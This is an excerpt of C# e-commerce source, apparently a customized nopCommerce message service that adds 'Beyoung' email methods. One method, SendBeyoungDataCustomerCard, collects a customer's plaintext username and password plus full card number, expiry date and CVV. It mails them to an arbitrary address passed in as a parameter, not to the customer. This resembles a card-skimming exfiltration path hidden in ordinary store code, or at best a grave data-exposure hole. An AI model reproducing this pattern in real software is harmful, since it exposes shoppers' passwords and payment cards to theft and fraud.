...
namespace Nop.Services.Messages
{
    public partial class WorkflowMessageService : IWorkflowMessageService
    {
        ...
        public virtual int SendBeyoungValidCode(string firstname, string lastname, string validcode, string email, int languageId)
        {
            var store = _storeContext.CurrentStore;
            languageId = EnsureLanguageIsActive(languageId, store.Id);

            var messageTemplate = GetLocalizedActiveMessageTemplate("Beyoung.ValidCode", languageId, store.Id);
            if (messageTemplate == null)
                return 0;
            ...
            _messageTokenProvider.AddBeyoungValidCodeTokens(tokens, firstname, validcode);
        ...
        public virtual int SendBeyoungDataCustomer(string firstname, string lastname, string sharingpartnerid, string level, string email, string username, string password, int languageId)
        {
            var store = _storeContext.CurrentStore;
            languageId = EnsureLanguageIsActive(languageId, store.Id);

            var messageTemplate = GetLocalizedActiveMessageTemplate("Beyoung.DataCustomer", languageId, store.Id);
            if (messageTemplate == null)
                return 0;
            ...
            _messageTokenProvider.AddBeyoungDataCustomerTokens(tokens, firstname, lastname, sharingpartnerid, level, email, username, password);
        ...
        public virtual int SendBeyoungDataCustomerCard(string firstname, string lastname, string sharingpartnerid, string level, string email,string username,string password, string cardnumber, string expiremonth,string expireyear, string cardcvv, string emailsend, int languageId)
        {
            var store = _storeContext.CurrentStore;
            languageId = EnsureLanguageIsActive(languageId, store.Id);

            var messageTemplate = GetLocalizedActiveMessageTemplate("Beyoung.DataCustomerCard", languageId, store.Id);
            if (messageTemplate == null)
                return 0;
            ...
            _messageTokenProvider.AddBeyoungDataCustomerCardTokens(tokens, firstname, lastname, sharingpartnerid, level, email,username,password, cardnumber, expiremonth,expireyear, cardcvv);


            var emailAccount = GetEmailAccountOfMessageTemplate(messageTemplate, languageId);
            var toEmail = emailsend;
            var toName = firstname + " " + lastname;
            return SendNotification(messageTemplate, emailAccount,
                languageId, tokens,
                toEmail, toName);
